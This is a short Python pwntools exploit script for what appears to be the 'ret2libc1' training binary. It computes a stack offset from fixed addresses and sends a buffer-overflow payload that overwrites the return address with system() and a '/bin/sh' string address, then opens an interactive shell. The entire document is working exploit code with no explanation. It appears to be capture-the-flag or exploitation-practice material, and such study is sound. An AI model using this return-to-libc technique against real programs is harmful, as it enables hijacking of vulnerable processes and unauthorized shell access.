from pwn import *
from pwnlib.util.packing import p32

sh = process("./ret2libc1")

addr_s = 0xffffd58c
addr_ebp = 0xffffd5f8
len_ebp = addr_ebp - addr_s

addr_system = 0x08048460
addr_sh = 0x08048720

payload = b'a'*len_ebp + b'bbbb' + p32(addr_system) + b'cccc' + p32(addr_sh)

sh.sendline(payload)
sh.interactive()